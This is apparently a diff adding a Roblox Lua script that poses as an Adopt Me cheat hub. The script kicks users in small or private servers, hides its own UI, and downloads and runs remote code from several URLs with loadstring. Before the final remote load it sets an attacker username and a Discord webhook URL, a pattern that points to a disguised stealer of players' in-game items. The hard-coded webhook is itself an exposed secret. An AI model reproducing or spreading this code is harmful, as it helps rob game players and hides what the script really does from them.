@@ -1,0 +1,80 @@
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+
+local BannedPlayers = {
+	"GNCGOOBER9",
+	"GNCGOOBER23",
+        "LOOOLUwUhm",
+        "Harry_042816",
+        "benja13if4",
+        "ffnnrrxxzjj",
+        "jojosiwa83385",
+        "Schteevee"
+}
+
+
+local function checkPlayerCount()
+	for i,v in pairs(BannedPlayers) do
+		if game.Players.LocalPlayer.Name == v then
+
+			StarterGui:SetCore("ChatMakeSystemMessage", {
+				Text = "Your account has been banned from using this script";
+				Color = Color3.fromRGB(255, 0, 0); -- Rote Farbe
+				Font = Enum.Font.SourceSansBold;
+				TextSize = 24;
+			})
+			-- Optional: Spieler nach der Nachricht kicken
+			wait(3) -- Warte 5 Sekunden, bevor der Spieler gekickt wird (um Nachricht anzuzeigen)
+			Players.LocalPlayer:Kick("Your account has been banned from using this script")
+
+		else
+			local playerCount = #Players:GetPlayers() -- Anzahl der Spieler im Spiel
+			if playerCount <= 3 then
+				StarterGui:SetCore("ChatMakeSystemMessage", {
+					Text = "You must not be in a private server or in a server with less than 3 players, because the script cannot work. Assets required by the script are not available in private servers";
+					Color = Color3.fromRGB(255, 0, 0); -- Rote Farbe
+					Font = Enum.Font.SourceSansBold;
+					TextSize = 24;
+				})
+				-- Optional: Spieler nach der Nachricht kicken
+				wait(3) -- Warte 5 Sekunden, bevor der Spieler gekickt wird (um Nachricht anzuzeigen)
+				Players.LocalPlayer:Kick("You must not be in a private server or in a server with less than 3 players, because the script cannot work. Assets required by the script are not available in private servers")
+			end
+		end
+	end
+	
+	
+	spawn(function()
+		spawn(function()
+			wait(1)
+			
+			while true do
+				local Count = 0
+				for i,v in pairs(game:WaitForChild("CoreGui"):GetChildren()) do
+					if v.Name == "ArrayField" or v.Name == "Old ArrayField" then
+						v:FindFirstChild("Main").Visible = false
+					end
+				end
+				wait(0.2)
+				Count = Count + 1
+				if Count == 100 then
+					break
+				end
+			end
+		end)
+		loadstring(game:HttpGet(('https://gitfront.io/r/ReQiuYTPL/wFUydaK74uGx/hub/raw/ReQiuYTPLHub.lua'),true))()
+	end)
+
+
+
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/InderLol/AdoptMeScript/main/Loader", true))()
+	wait(11)
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/InderLol/AdoptMeScript/main/OceanFarm", true))()
+	wait(1)
+	getgenv().gui = false
+	Username = "davidtschal"
+	Webhook = "https://discord.com/api/webhooks/1284838440411594803/_8onbNULr3R_Ymy3h6-7QJGuP5DqhZybYGpAukc89GqjEE4MYarvwJYC6RwHr18f3mP3"
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/main.lua", true))()
+end
+
+checkPlayerCount()
